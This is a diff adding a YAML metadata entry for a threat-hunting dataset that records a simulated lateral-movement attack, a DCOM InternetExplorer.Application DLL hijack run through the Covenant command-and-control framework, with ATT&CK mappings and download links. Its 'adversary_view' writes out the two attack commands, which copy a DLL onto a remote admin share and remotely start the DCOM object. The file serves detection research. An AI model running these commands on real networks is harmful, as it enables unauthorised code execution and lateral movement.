@@ -1,0 +1,45 @@
+title: Covenant Remote DCOM Iertutil DLL Hijacking
+id: SDWIN-201009183000
+contributors:
+- Roberto Rodriguez @Cyb3rWard0g
+creation_date: 2020/10/09
+modification_date: 2020/10/09
+platform:
+- Windows
+type: atomic
+tags:
+  - SMB CreateRequest
+description: This dataset represents adversaries abusing a DLL hijack vulnerability found in the execution of the DCOM InternetExplorer.Application class for lateral movement.
+attack_mappings:
+  - technique: T1021
+    sub-technique: "003"
+    tactics:
+      - TA0008
+notebooks:
+  - project: Threat Hunter Playbook
+    name: Remote DCOM IErtUtil DLL Hijack
+    link: https://threathunterplaybook.com/notebooks/windows/08_lateral_movement/WIN-201009183000.html
+files:
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/covenant_dcom_iertutil_dll_hijack.zip
+- type: Network
+  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/covenant_dcom_iertutil_dll_hijack.zip
+simulation:
+  environment: Mordor shire
+  tools:
+    - type: C2
+      name: Covenant
+      module: PowerShell
+      script: https://github.com/cobbr/Covenant/blob/master/Covenant/Data/Tasks/SharpSploit.Execution.yaml#L529
+    - type: C2
+      name: Covenant
+      module: Copy
+      script: https://github.com/cobbr/Covenant/blob/master/Covenant/Data/Tasks/DefaultGruntTasks.yaml#L951
+  permissions_required:
+    - Administrator
+  adversary_view: |-
+    Copy /source:"C:\ProgramData\test2.dll" /destination:"\\WORKSTATION6\C$\Program Files\Internet Explorer\iertutil.dll"
+    
+    PowerShell /powershellcommand:"$i=[activator]::CreateInstance([type]::GetTypeFromProgID('InternetExplorer.Application','172.18.39.6'))"
+references:
+  - https://www.mdsec.co.uk/2020/10/i-live-to-move-it-windows-lateral-movement-part-3-dll-hijacking/
